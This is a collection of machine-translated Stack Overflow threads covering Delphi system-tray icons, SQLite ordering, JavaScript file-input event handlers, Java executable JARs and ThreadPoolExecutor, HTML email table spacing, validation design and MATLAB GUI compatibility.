  TrayIcon1.Icon.Assign(MyIcon);
  TrayIcon1.Icons.AddIcon(MyIcon);

  MyIcon.LoadFromFile('icons/earth2.ico');
  TrayIcon1.Icons.AddIcon(MyIcon);
  MyIcon.LoadFromFile('icons/earth3.ico');
  TrayIcon1.Icons.AddIcon(MyIcon);
  MyIcon.LoadFromFile('icons/earth4.ico');
  TrayIcon1.Icons.AddIcon(MyIcon);

  { Set up a hint message and the animation interval. }
  TrayIcon1.Hint := 'Hello World!';
  TrayIcon1.AnimateInterval := 200;

  { Set up a hint balloon. }
  TrayIcon1.BalloonTitle := 'Restoring the window.';
  TrayIcon1.BalloonHint :=
    'Double click the system tray icon to restore the window.';
  TrayIcon1.BalloonFlags := bfInfo;
end;

// Add this to the `TTrayIcon.OnDoubleClick` event handler
procedure TForm1.TrayIcon1DblClick(Sender: TObject);
begin
  { Hide the tray icon and show the window,
  setting its state property to wsNormal. }
  TrayIcon1.Visible := False;
  Show();
  WindowState := wsNormal;
  Application.BringToFront();
end; 
```

对于右键单击时获得的菜单，将 a 添加`TPopupMenu`到表单中，在其上添加所需的项目，像往常一样为这些项目编写事件处理程序，然后将 分配`PopupMenu`给`TrayIcon.PopupMenu`属性。

“模糊的图标”是由于您没有使用正确的图标大小而导致 Windows 被迫缩放（拉伸）它们。使用图标编辑器为每个图标创建多个尺寸的图像（一个图标文件中可以有多个尺寸）。

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2014-06-02T08:24:07.863

I drop a TrayIcon onto myForm, then i add this simple code:

```
type
  TmyForm = class(TForm)
    ...
    TrayIcon: TTrayIcon;
    procedure FormCreate(Sender: TObject);
    ...
    procedure TrayIconClick(Sender: TObject);
    ...
  private
    { Private declarations }
    procedure OnMinimize(Sender:TObject);
  public
    { Public declarations }
  end;

procedure TmyForm.FormCreate(Sender: TObject);
begin // When form is created
     Application.OnMinimize:=OnMinimize; // Set the event handler for application minimize
end;

procedure TmyForm.OnMinimize(Sender:TObject);
begin // When application is minimized by user and/or by code
     Hide; // This is to hide it from taskbar
end;

procedure TmyForm.TrayIconClick(Sender: TObject);
begin // When clicking on TrayIcon
     if Visible
     then begin // Application is visible, so minimize it to TrayIcon
               Application.Minimize; // This is to minimize the whole application
          end
     else begin // Application is not visible, so show it
               Show; // This is to show it from taskbar
               Application.Restore; // This is to restore the whole application
          end;
end; 
```

This creates a TrayIcon allways visible, and when you click on it:

*   If the application is Visible, it will be Hidden form taskbar and from screen
*   If the application is Hidden, it will be Shown form taskbar and from screen

In other words, clicking on TrayIcon the application will change its visibility; just as minimizing it to TrayIcon bar.

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2014-06-13T22:43:56.080

...在 Delphi 6 中，不`TTrayIcon`存在，您可以使用以下简单代码：

```
unit MainUnit;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ShellAPI, StdCtrls, Menus;

const WM_ICONTRAY = WM_USER+1;

type
  TForm1 = class(TForm)
    PopupMenu1: TPopupMenu;
    ShowForm1: TMenuItem;
    HideForm1: TMenuItem;
    Exit1: TMenuItem;
    procedure TrayMessage(var Msg: TMessage); message WM_ICONTRAY;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);
    procedure ShowForm1Click(Sender: TObject);
    procedure HideForm1Click(Sender: TObject);
    procedure Exit1Click(Sender: TObject);
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
  private
   TrayIconData: TNotifyIconData;
  end;

var
  Form1: TForm1;
  MustExit:boolean;

implementation

{$R *.dfm}

procedure TForm1.FormCreate(Sender: TObject);
begin
  MustExit:=false;
  TrayIconData.cbSize:=SizeOf(TrayIconData);
  TrayIconData.Wnd:=Handle;
  TrayIconData.uID:=0;
  TrayIconData.uFlags:=NIF_MESSAGE + NIF_ICON + NIF_TIP;
  TrayIconData.uCallbackMessage:=WM_ICONTRAY;
  TrayIconData.hIcon:=Application.Icon.Handle;
  StrPCopy(TrayIconData.szTip,Application.Title);
  Shell_NotifyIcon(NIM_ADD, @TrayIconData);
end;

procedure TForm1.FormDestroy(Sender: TObject);
begin
  Shell_NotifyIcon(NIM_DELETE, @TrayIconData);
end;

procedure TForm1.TrayMessage(var Msg: TMessage);
var p:TPoint;
begin
  case Msg.lParam of
    WM_LBUTTONDOWN: begin
                     Form1.Show;
                     Application.Restore;
                    end;
    WM_RBUTTONDOWN: begin
                     GetCursorPos(p);
                     PopUpMenu1.Popup(p.x,p.y);
                    end;
  end;
end;

// Popup "Form Show" menu item OnClick 
procedure TForm1.ShowForm1Click(Sender: TObject);
begin
 Form1.Show;
end;

// Popup "Form Hide" menu item OnClick    
procedure TForm1.HideForm1Click(Sender: TObject);
begin
 Form1.Hide;
end;

// Popup "Exit" menu item OnClick
procedure TForm1.Exit1Click(Sender: TObject);
begin
 MustExit:=true;
 Close;
end;

procedure TForm1.FormClose(Sender: TObject; var Action: TCloseAction);
begin
 if MustExit then exit;
 Form1.Hide;
 Action:=caNone;
end;

end. 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2012-08-08T06:53:55.777

我已经实现了以下代码。在这里一切都很好，除了一个。最小化表单后，它转到“SystemTray”，但也可以在“TaskBar”中使用。对于我的应用程序，“Form001”的“AlphaBlend”属性为真，“AlphaBlendValue”为“0”。

```
unit KoushikHalder001;

interface

uses
  Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants, System.Classes, Vcl.Graphics,
  Vcl.Controls, Vcl.Forms, Vcl.Dialogs, Vcl.StdCtrls, Vcl.Buttons, Vcl.ExtCtrls, Vcl.Imaging.pngimage,
  Vcl.AppEvnts, Vcl.ImgList, Vcl.Menus;

type
  TForm001 = class(TForm)
    Edit001: TEdit;
    Background: TImage;
    BitBtn001: TBitBtn;
    BitBtn002: TBitBtn;
    FadeInTimer: TTimer;
    FadeOutTimer: TTimer;
    FormMinimizeTimer: TTimer;
    FormRestoreTimer: TTimer;
    TrayIcon: TTrayIcon;
    PopupMenu: TPopupMenu;
    ImageList: TImageList;
    ApplicationEvents: TApplicationEvents;
    Form001Close: TMenuItem;
    Form001Hide: TMenuItem;
    Form001Show: TMenuItem;
    Form002Close: TMenuItem;
    Form002Hide: TMenuItem;
    Form002Show: TMenuItem;
    N01: TMenuItem;
    N02: TMenuItem;
    N03: TMenuItem;
    N04: TMenuItem;
    N05: TMenuItem;
    N06: TMenuItem;
    N07: TMenuItem;
    N08: TMenuItem;
    N09: TMenuItem;
    N10: TMenuItem;
    procedure FormClose(Sender: TObject; var Action: TCloseAction);
    procedure FormCloseQuery(Sender: TObject; var CanClose: Boolean);
    procedure FormCreate(Sender: TObject);
    procedure FormHide(Sender: TObject);
    procedure FormShow(Sender: TObject);
    procedure BitBtn001Click(Sender: TObject);
    procedure BitBtn002Click(Sender: TObject);
    procedure FadeInTimerTimer(Sender: TObject);
    procedure FadeOutTimerTimer(Sender: TObject);
    procedure FormMinimizeTimerTimer(Sender: TObject);
    procedure FormRestoreTimerTimer(Sender: TObject);
    procedure ApplicationEventsMinimize(Sender: TObject);
    procedure TrayIconDblClick(Sender: TObject);
    procedure Form001CloseClick(Sender: TObject);
    procedure Form001HideClick(Sender: TObject);
    procedure Form001ShowClick(Sender: TObject);
    procedure Form002CloseClick(Sender: TObject);
    procedure Form002HideClick(Sender: TObject);
    procedure Form002ShowClick(Sender: TObject);
  private
    { Private declarations }
    CrossButtonClick: Boolean;
    procedure WMNCHitTest(var Msg: TWMNCHitTest) ; message WM_NCHitTest;
    procedure WMSysCommand(var Msg: TWMSysCommand) ; message WM_SysCommand;
  public
    { Public declarations }
  end;

var
  Form001: TForm001;

implementation

{$R *.dfm}

uses KoushikHalder002;

procedure TForm001.WMNCHitTest(var Msg: TWMNCHitTest);
begin
  inherited;
  if ControlAtPos(ScreenToClient(Msg.Pos), True, True, True)= nil
    then
      begin
        if Msg.Result=htClient then Msg.Result := htCaption;
      end;
end;

procedure TForm001.WMSysCommand(var Msg: TWMSysCommand);
begin
  case Msg.CmdType of
    SC_MINIMIZE:
      begin
        if Form001.AlphaBlendValue > 0 then
          begin
            Form001.FormMinimizeTimer.Enabled := true;
            Exit;
          end;
      end;
    SC_RESTORE:
      begin
        if Form001.AlphaBlendValue < 220 then
          begin
            Form001.FormRestoreTimer.Enabled := True;
          end;
      end;
  end;
  inherited;
end;

procedure TForm001.ApplicationEventsMinimize(Sender: TObject);
begin
  Form001.FormMinimizeTimer.Enabled := true;
  TrayIcon.Visible := True;
  TrayIcon.Animate := True;
  TrayIcon.ShowBalloonHint;
end;

procedure TForm001.BitBtn001Click(Sender: TObject);
begin
  if Form002.WindowState = wsMinimized then
    begin
      Form002.Perform(WM_SYSCOMMAND, SC_RESTORE, 0);
    end
    else
    Form002.show;
end;

procedure TForm001.BitBtn002Click(Sender: TObject);
begin
  Form002.FadeOutTimer.Enabled := true;
  Form001.FadeOutTimer.Enabled := true;
end;

procedure TForm001.Form001CloseClick(Sender: TObject);
begin
  Form002.FadeOutTimer.Enabled := true;
  Form001.FadeOutTimer.Enabled := true;
end;

procedure TForm001.Form001HideClick(Sender: TObject);
begin
Form001.FormMinimizeTimer.Enabled := true;
end;

procedure TForm001.Form001ShowClick(Sender: TObject);
begin
  if Form001.WindowState = wsMinimized then
    begin
      Form001.Perform(WM_SYSCOMMAND, SC_RESTORE, 0);
    end
    else
    Form001.show;
end;

procedure TForm001.Form002CloseClick(Sender: TObject);
begin
Form002.FadeOutTimer.Enabled := true;
end;

procedure TForm001.Form002HideClick(Sender: TObject);
begin
Form002.FormMinimizeTimer.Enabled := true;
end;

procedure TForm001.Form002ShowClick(Sender: TObject);
begin
  if Form002.WindowState = wsMinimized then
    begin
      Form002.Perform(WM_SYSCOMMAND, SC_RESTORE, 0);
    end
    else
    Form002.show;
end;

procedure TForm001.FormClose(Sender: TObject; var Action: TCloseAction);
begin
  Form001.FadeOutTimer.Enabled := true;
end;

procedure TForm001.FormCloseQuery(Sender: TObject; var CanClose: Boolean);
begin
  if CrossButtonClick = true
    then
      begin
        CanClose := true;
        Exit;
      end;
  CanClose := false;
  Form001.FadeOutTimer.Enabled := true;
end;

procedure TForm001.FormCreate(Sender: TObject);
begin
  Form001.FadeInTimer.Enabled := true;
end;

procedure TForm001.FormHide(Sender: TObject);
begin
  Form001.FadeOutTimer.Enabled := true;
end;

procedure TForm001.FormShow(Sender: TObject);
begin
  Form001.FadeInTimer.Enabled := true;
end;
procedure TForm001.TrayIconDblClick(Sender: TObject);
begin
  Form001.FormRestoreTimer.Enabled := true;
  TrayIcon.Visible := False;
  WindowState := wsNormal;
  Application.BringToFront();
end;

procedure TForm001.FadeInTimerTimer(Sender: TObject);
begin
  if Form001.AlphaBlendValue >= 220
    then
      begin
        Form001.FadeInTimer.Enabled := false;
      end
    else
      begin
        Form001.AlphaBlendValue := Form001.AlphaBlendValue + 10;
        CrossButtonClick := false;
      end;
end;

procedure TForm001.FadeOutTimerTimer(Sender: TObject);
begin
  if Form001.AlphaBlendValue <= 0
    then
      begin
        Form001.FadeOutTimer.Enabled := false;
        CrossButtonClick := true;
        Self.Close;
      end
    else
      begin
        Form001.AlphaBlendValue := Form001.AlphaBlendValue - 10;
        CrossButtonClick := true;
      end;
end;

procedure TForm001.FormMinimizeTimerTimer(Sender: TObject);
begin
  if Form001.AlphaBlendValue > 0 then
    begin
      Form001.AlphaBlendValue := Form001.AlphaBlendValue - 10;
    end
  else
    begin
      Form001.FormMinimizeTimer.Enabled := false;
      Perform(WM_SYSCOMMAND, SC_MINIMIZE, 0);
    end;
end;

procedure TForm001.FormRestoreTimerTimer(Sender: TObject);
begin
  if Form001.AlphaBlendValue < 220 then
    begin
      Form001.AlphaBlendValue := Form001.AlphaBlendValue + 10;
    end
  else
    begin
      Form001.FormRestoreTimer.Enabled := false;
    end;
end;

end. 
```

如果我执行以下操作

```
 Application.MainFormOnTaskbar := false; 
```

表格是完全不可见的。我认为应该有一个错误。但我找不到它。

# android - 如何按添加顺序列出 SQLite 中的条目？

> ID：11820108
> 
> 赞同：0
> 
> 时间：2012-08-05T21:10:28.380
> 
> 标签：android, sqlite

我正在编写一个使用 SQLite 的 android 应用程序。我希望条目按日期列排序，但如果日期相同，那么我希望它们按添加顺序（降序）排序。这就是我所拥有的，它适用于第一个条件......无论如何添加第二个而不添加 HH:MM:SS 到日期条目？

SELECT * FROM transactions ORDER BY transactionDate DESC

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T21:14:21.083

如果您使用的是自动分配的 rowid，您可以按它们排序 - 这样即使在同一秒内添加了两个条目，您也可以正确排序它们。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T21:17:52.910

使用[ROWID](https://stackoverflow.com/a/4657565/477878)应该可以做到；

```
SELECT * FROM transactions ORDER BY transactionDate DESC, ROWID DESC; 
```

演示[在这里](http://sqlfiddle.com/#!7/ccaa1/2)。

# javascript - 如何删除 DOM 事件处理程序的重复 JavaScript 代码？

> ID：11820115
> 
> 赞同：3
> 
> 时间：2012-08-05T21:11:02.460
> 
> 标签：javascript, dom, dom-events, readability

我正在尝试删除重复的 JavaScript 代码。我有一页有很多`<input type="file">`. 每个加载一个图像并执行一些不同的处理。问题是我有以下代码的许多重复项：

```
inputFile1.onchange = function (e) {
        var file = e.target.files[0];
        if (typeof file == 'undefined' || file == null) {
            return;
        }
        var imageType = /image.*/;
        if (!file.type.match(imageType)) {
            window.alert('Bad file type!');
            return;
        }
        var reader = new FileReader();
        reader.onloadend = function (e) {
            var imageLoader = new Image();
            imageLoader.onload = function () {
                // process image
            };
            imageLoader.src = e.target.result;
        };
        reader.readAsDataURL(file);
    };

inputFile2.onchange = ... (repeats all but process image)
inputFile3.onchange = ... (repeats all but process image) 
```

只有`process image`注释处的代码有所不同。如何删除周围的重复代码？

我知道 JavaScript 函数是对象。如何定义函数对象并为每个事件处理程序创建一个不同的实例，为`process image`每个对象传递不同的函数？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-05T21:15:14.580

您可以使用将单个回调作为参数的闭包为此类函数创建生成器：

```
function getChangeHandler(loadCallback) {
    return function (e) {
        var file = e.target.files[0];
        if (typeof file == 'undefined' || file == null) {
            return;
        }
        var imageType = /image.*/;
        if (!file.type.match(imageType)) {
            window.alert('Bad file type!');
            return;
        }
        var reader = new FileReader();
        reader.onloadend = function (e) {
            var imageLoader = new Image();
            imageLoader.onload = loadCallback; // <= uses the closure argument
            imageLoader.src = e.target.result;
        };
        reader.readAsDataURL(file);
    };
}
inputFile1.onchange = getChangeHandler(function() { /* custom process image */ });
inputFile2.onchange = getChangeHandler(function() { /* custom process image */ });
inputFile3.onchange = getChangeHandler(function() { /* custom process image */ }); 
```

* * *

另一种最终更好的方法是`change`对所有输入仅使用一个 -event 处理程序，该处理程序通过输入`name`或输入动态选择自定义图像处理器`id`：

```
var imageProcessors = {
    "box1": function() { … },
    "anotherbox": function() { … },
    …
};
function changeHandler(e) {
    var input = this; // === e.target
    …
    reader.onloadend = function (e) {
        …
        imageLoader.onload = imageProcessors[input.id];
    };
}
// and bind this one function on all inputs (jQuery-style):
$("#box1, #anotherbox, …").click(changeHandler); 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-05T21:17:59.677

您可以编写一个返回函数的函数：

```
function processFile(callback) { //callback is the unique file processing routine
    return function(e) {
        var file = e.target.files[0];
        if (typeof file == 'undefined' || file == null) {
            return;
        }
        var imageType = /image.*/;
        if (!file.type.match(imageType)) {
            window.alert('Bad file type!');
            return;
        }
        var reader = new FileReader();
        reader.onloadend = function (e) {
            var imageLoader = new Image();
            imageLoader.onload = callback; //Put it here!
            imageLoader.src = e.target.result;
        };
        reader.readAsDataURL(file);
    };
} 
```

然后像这样调用：

```
inputFile1.onchange = processFile(function() {
      //file processing for number 1
});
inputFile2.onchange = processFile(function() {
      //file processing for number 2
});
inputFile3.onchange = processFile(function() {
      //file processing for number 3
}); 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-08-05T21:26:52.867

这是一个 EMCA5 解决方案，只是为了把它混在一起。它根据元素绑定动态事件回调。

我假设每个字段都有一个 ID（`input1`等），但对代码进行了一些修改（即通过其他方式识别触发器元素），这不是必需的。

```
Array.prototype.slice.call(document.querySelectorAll('input[type=file]')).forEach(function(element) {

    /* prepare code specific to the element */
    var input_specific_code = (function() {
        switch (element.id) {
            case 'input1': return function() { /* #input1 code here */ };
            case 'input2': return function() { /* #input2 code here */ };
            case 'input3': return function() { /* #input3 code here */ };
        }
    })();

    element.addEventListener('change', (function(input_specific_code) { return function(evt) {
        var id_of_trigger_input = element.id;

        /* common code here */

        /* element-specific code */
        input_specific_code();

        /* continuation of common code */

    }; })(input_specific_code), false);
}); 
```

# java - 如何使用 java 和 JAR 显示消息框

> ID：11820118
> 
> 赞同：0
> 
> 时间：2012-08-05T21:11:47.197
> 
> 标签：java, eclipse, jar

我正在尝试构建可执行的 jar 文件。我对此很陌生，并且不确定它应该如何工作。我正在使用 eclipse 64 位和 windows 7。我正在将项目导出到 jar 文件。这是项目代码。当我双击该文件时，它什么也不做，我希望看到一个消息框。你能告诉我我做错了什么并帮助我解决它。谢谢。

```
import javax.swing.*;
public class Starter {
public static void main(String[] args) 
{
  String st="Welcome";
  JOptionPane.showMessageDialog(null,st);
}
} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-05T21:21:16.227

听起来好像您的 jar 文件中的 MANIFEST.MF 中没有定义 Main-Class。

有许多关于如何创建可用的可执行 jar 的指南，例如[这个。](http://www.mkyong.com/java/how-to-make-an-executable-jar-file/)

# java - ThreadPoolExecutor 和队列

> ID：11820120
> 
> 赞同：7
> 
> 时间：2012-08-05T21:12:40.517
> 
> 标签：java, multithreading, concurrency, java.util.concurrent, threadpoolexecutor

我认为使用[ThreadPoolExecutor](http://docs.oracle.com/javase/6/docs/api/java/util/concurrent/ThreadPoolExecutor.html)我们可以提交`Runnable`要`BlockingQueue`在构造函数中传递或使用`execute`方法执行的 s。
另外我的理解是，如果任务可用，它将被执行。
我不明白的是：

```
public class MyThreadPoolExecutor {  

    private static ThreadPoolExecutor executor;  

    public MyThreadPoolExecutor(int min, int max, int idleTime, BlockingQueue<Runnable> queue){  
        executor = new ThreadPoolExecutor(min, max, 10, TimeUnit.MINUTES, queue);   
        //executor.prestartAllCoreThreads();  
    }  

    public static void main(String[] main){
        BlockingQueue<Runnable> q = new LinkedBlockingQueue<Runnable>();
        final String[] names = {"A","B","C","D","E","F"};  
        for(int i = 0; i < names.length; i++){  
            final int j = i;  
            q.add(new Runnable() {  

                @Override  
                public void run() {  
                    System.out.println("Hi "+ names[j]);  

                }  
            });         
        }  
        new MyThreadPoolExecutor(10, 20, 1, q);   
        try {  
            TimeUnit.SECONDS.sleep(5);  
        } catch (InterruptedException e) {  
            // TODO Auto-generated catch block  
            e.printStackTrace();  
        }  
        /*executor.execute(new Runnable() {  

            @Override  
            public void run() {  

                System.out.println("++++++++++++++");  

            }   
        });  */
        for(int i = 0; i < 100; i++){  
            final int j = i;  
            q.add(new Runnable() {   

                @Override  
                public void run() {  
                    System.out.println("Hi "+ j);  

                }  
            });  
        }   

    }  

} 
```

`executor.prestartAllCoreThreads();`除非我在构造函数中取消注释或调用`execute`打印的可运行文件`System.out.println("++++++++++++++");`（它也被注释掉） ，否则这段代码不会做任何事情。

为什么？
引用（我的重点）：

> 默认情况下，即使是核心线程也**只会在新任务到达时才最初创建和启动**，但这可以使用方法 prestartCoreThread() 或 prestartAllCoreThreads() 动态覆盖。如果您使用非空队列构造池，您可能希望预启动线程。

行。所以我的队列不是空的。但是我创建了s ，然后我将新`executor`的s 添加到队列中（在循环中到 100）。 这个循环不算吗？ 为什么它不起作用，我必须要么或明确地打电话？`sleep``Runnable`
`new tasks arrive`
`prestart``execute`

* * *

## 回答 #1

> 赞同：10
> 
> 时间：2012-08-05T21:23:08.473

当任务通过执行到达时产生工作线程，这些是与底层工作队列交互的线程。如果您从非空工作队列开始，则需要预先启动工作人员。请参阅[OpenJDK 7 中的实现](http://grepcode.com/file/repository.grepcode.com/java/root/jdk/openjdk/7-b147/java/util/concurrent/ThreadPoolExecutor.java)。

我再说一遍，**工作人员是与工作队列交互的人**。它们仅在通过时按需生成`execute`。（或它上面的层，例如`invokeAll`，`submit`等）如果它们没有启动，那么添加到队列中的工作量无关紧要，因为没有**任何工作人员开始**检查它。

`ThreadPoolExecutor`[除非有必要，否则不会生成工作线程，或者如果您通过prestartAllCoreThreads](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/ThreadPoolExecutor.html#prestartAllCoreThreads%28%29)和[prestartCoreThread](http://docs.oracle.com/javase/7/docs/api/java/util/concurrent/ThreadPoolExecutor.html#prestartCoreThread%28%29)方法抢先创建它们。如果没有工作人员启动，那么队列中的任何工作都无法完成。

添加初始`execute`工作的原因是它强制创建**唯一**的核心工作线程，然后可以开始处理队列中的工作。您也可以调用`prestartCoreThread`和接收类似的行为。如果要启动*所有*工作人员，则必须`prestartAllCoreThreads`通过 调用或提交该数量的任务`execute`。

请参阅`execute`下面的代码。

```
/**
 * Executes the given task sometime in the future.  The task
 * may execute in a new thread or in an existing pooled thread.
 *
 * If the task cannot be submitted for execution, either because this
 * executor has been shutdown or because its capacity has been reached,
 * the task is handled by the current {@code RejectedExecutionHandler}.
 *
 * @param command the task to execute
 * @throws RejectedExecutionException at discretion of
 *         {@code RejectedExecutionHandler}, if the task
 *         cannot be accepted for execution
 * @throws NullPointerException if {@code command} is null
 */
public void execute(Runnable command) {
    if (command == null)
        throw new NullPointerException();
    /*
     * Proceed in 3 steps:
     *
     * 1\. If fewer than corePoolSize threads are running, try to
     * start a new thread with the given command as its first
     * task.  The call to addWorker atomically checks runState and
     * workerCount, and so prevents false alarms that would add
     * threads when it shouldn't, by returning false.
     *
     * 2\. If a task can be successfully queued, then we still need
     * to double-check whether we should have added a thread
     * (because existing ones died since last checking) or that
     * the pool shut down since entry into this method. So we
     * recheck state and if necessary roll back the enqueuing if
     * stopped, or start a new thread if there are none.
     *
     * 3\. If we cannot queue task, then we try to add a new
     * thread.  If it fails, we know we are shut down or saturated
     * and so reject the task.
     */
    int c = ctl.get();
    if (workerCountOf(c) < corePoolSize) {
        if (addWorker(command, true))
            return;
        c = ctl.get();
    }
    if (isRunning(c) && workQueue.offer(command)) {
        int recheck = ctl.get();
        if (! isRunning(recheck) && remove(command))
            reject(command);
        else if (workerCountOf(recheck) == 0)
            addWorker(null, false);
    }
    else if (!addWorker(command, false))
        reject(command);
} 
```

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-08-05T21:43:44.757

BlockingQueue 不是一个神奇的线程调度程序。如果你将 Runnable 对象提交到队列中，并且没有正在运行的线程来消费这些任务，那么它们当然不会被执行。另一方面，如果需要，execute 方法会根据线程池配置自动调度线程。如果你预先启动了所有的核心线程，那里就会有线程来消费队列中的任务。

# html - 表格行之间的线

> ID：11820125
> 
> 赞同：0
> 
> 时间：2012-08-05T21:13:12.267
> 
> 标签：html

这是我的代码：

```
<html>
<head>
<title>PageTitle!</title>
<meta http-equiv="Content-Type" content="text/html; charset=windows-1250">
</head>
<body bgcolor="#FFFFFF" leftmargin="0" topmargin="0" marginwidth="0" marginheight="0">
<table id="Table_01" width="590" height="531" border="0" cellpadding="0" cellspacing="0">
    <tr>    <td>
            <a href="http://mypage.com" border="0"><img src="top.jpg" width="590" height="90" alt="" border="0"></a></td>
    </tr>
    <tr>
        <td>
            <a href="http://mypage.com" border="0"><img src="content.jpg" width="590" height="441" alt="" border="0"></a></td>
    </tr>
</table>
</body>
</html> 
```

这里有什么问题：

*对不起，我必须删除这张照片*

`<tr>`为什么表格之间有换行符？我正在寻找非 CSS 解决方案，这是一个简单的邮件。它的问题**仅在 gmail 中**显示。当我下载到麻雀或移动设备时，空行消失了。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-05T21:38:52.747

将图像上的 CSS 设置为：

```
img {vertical-align:middle;}​ 
```

您也可以将它们向左浮动，但这似乎没有必要。

请参阅此**[jsFiddle 示例](http://jsfiddle.net/j08691/WRBwq/)**。然后删除 CSS 和间隙重新出现。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-08-05T21:25:41.360

您需要定义一个文档类型[http://www.w3schools.com/tags/tag_doctype.asp](http://www.w3schools.com/tags/tag_doctype.asp)

# java - 在创建对象之前如何处理大量必要的验证检查？

> ID：11820127
> 
> 赞同：4
> 
> 时间：2012-08-05T21:13:25.647
> 
> 标签：java, design-patterns

我有一门模拟 FK 关系的课程。它有 2 个列表。这些列表分别包含父表和子表的列名。这些清单是客户传给我的。现在在创建我的 FK 对象之前，我认为有必要进行以下检查（按顺序）：

1.  检查列表是否不为空。
2.  检查列表是否包含 null。
3.  如果列表包含重复的列？
4.  两个列表的大小相等。

所以你可以看到总共有 7 次检查。有这么多支票可以吗？

如果可以进行这么多检查，是否有任何模式可以处理此类情况（验证检查次数较多）？

如果不正常，那我该怎么办？我是否应该将这些条件记录为合同的一部分并提及如果违反此合同，API 将产生荒谬的结果？

编辑：基本上，我正在尝试获取这两个列表并生成特定于数据库的查询。因此，正确构建此对象非常重要。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-06T04:49:53.780

就像大家说的，这取决于你。没有这样的固定/标准指南。但是为了简单起见，您必须将所有验证逻辑放在一个地方，以便它保持可读性和易于更改。

正如您所说，一个建议可能是您的所有验证逻辑似乎都非常面向业务......我的意思是最终用户不应该为您的数据库配置而烦恼。假设您的班级名称 FKEntity。因此，如果您遵循实体概念，那么您可以将验证逻辑放在 FKEntity.validate()（实现接口 Validatable）中，这将验证特定实体......这是适用于所有 FKEntity 类型对象的那种验证逻辑以同样的方式。如果您需要任何验证逻辑来​​比较/处理不同的 FKEntity 相互依赖（例如，如果有一个 FKEntity 具有某个值“x”，那么没有其他实体可以将“x”作为它们的值，如果他们这样做，那么你可以不允许整个实体列表持续存在），那么您可以将逻辑放在您的服务层中。

```
Inteface Validatable { void validate() throws InvalidEntityException; }   

Class FKEntity implements Validatable {
  //..
  public void validate() throws InvalidEntityException {
     //your entity specific logic
  }
}

Class FKDigestService {

    public digestEntities() {

      try {
      for(FKEntity e : entityList)
         e.validate();

      //your collective validation logic goes here
      } catch (EntityValidationException e) {//do whatever you want}
    }

} 
```

这会给你两个好处，

1.  您的实体特定验证逻辑保存在一个地方（尝试将大部分逻辑视为实体特定逻辑）

2.  您的集体逻辑与实体逻辑分开，因为您不能将这些逻辑放在您的实体中，因为这些逻辑仅适用于 FKEntity 的集合，但不适用于单个实体......这是业务逻辑，而不是验证逻辑

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-05T21:23:35.397

这是一个复杂的问题，所以解决方案应该尽可能简单，不要让它变得更加复杂和难以理解。

我的方法是：

一些包装私有方法的公共方法命名为类似的东西`doAllNeededListsValidationInFixedOrder()`，我将在其中创建另一个私有方法-每个方法都用于每个需要的验证。

并且像ofc这样的编写方法`doAllNeededListsValidationInFixedOrder`应该遵循一些可靠的javadoc，即使它不是公开的。

如果你想寻找模式 - 解决方案不会那么简单。要求按给定顺序进行检查的基本方法是创建批次或类 - 每个状态都告诉该对象在一次检查之后，在另一次检查之前。

因此，您可以通过模式来实现这一点`State`- 将每个检查视为对象的新状态。

或者

您可以使用诸如`Builder`模式之类的方法来强制调用方法来创建对象。它基本上是使用许多接口来让每个（构建）方法（这里是验证）从不同的接口触发，以控制它们的顺序。

回到开始 -**使用简单、文档齐全且命名正确的方法，隐藏验证方法集，对我来说似乎更好。**

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-08-05T21:24:24.763

我取决于你。许多检查没有真正的论据。如果您正在开发 API，这对其他程序员可能非常有用。它将使您自己的程序更加可靠。

我认为重要的一点是，你在一个点上进行检查。您的 API 必须有一个干净简单的接口。在这个界面，可以进行检查。在这些检查之后，您可以确定一切正常。

如果你把支票扔掉会发生什么？会在某处抛出异常还是程序会做某事？如果程序能正常工作并且做一些不可预测的事情，你应该提供检查，否则事情会开始变得奇怪。但是，如果无论如何都会抛出异常，（我认为）你可以放弃检查。我的意思是，无论如何，该程序都会出现异常。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2016-01-02T15:11:27.867

> 如果可以进行这么多检查，是否有任何模式可以处理此类情况（验证检查次数较多）？

如果从数据转换的角度处理这些检查将变得微不足道。

1.  `List from a client`实际上是任何可能元素的任何列表

2.  `List from a client`将被转换为定义明确的`list of not duplicating not null elements`

3.  这种转换可以分解为几个简单的转换`ToNonNull`，，`ToNonNullList``ToNonDuplicatingList`

4.  最后一个要求本质上是从两个列表转换为一个对列表`ToPairs(ListA, ListB)`

放在一起就变成了：

```
ParentTableColumns = List1FromClient.
    ToNonNull.
    ToNonNullList.
    ToNonDuplicatingList

ChildTableColumns = List2FromClient.
    ToNonNull. 
    ToNonNullList.
    ToNonDuplicatingList

ParentChildColumnPairs = List.
    ToPairs(ParentTableColumns, ChildTableColumns) 
```

如果来自客户端的数据有效，则所有转换都成功并获得有效结果。

如果来自客户端的数据无效，则其中一个转换失败并产生错误消息。

# matlab - Matlab gui 2006 与新版本 2012 的兼容性

> ID：11820130
> 
> 赞同：0
> 
> 时间：2012-08-05T21:13:34.107
> 
> 标签：matlab

我正在尝试通过 2006 运行用 matlab 编写的 matlab gui 代码。我相信该代码适用于 2010，但是在运行 2012a 时，我只是得到 gui 的空白轮廓而没有显示任何按钮。有任何想法吗？如果您有任何问题，我可以提供更多信息。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-07T18:03:54.923

我选择了所有并在 GUIDE 中将其向下移动以查看按钮。

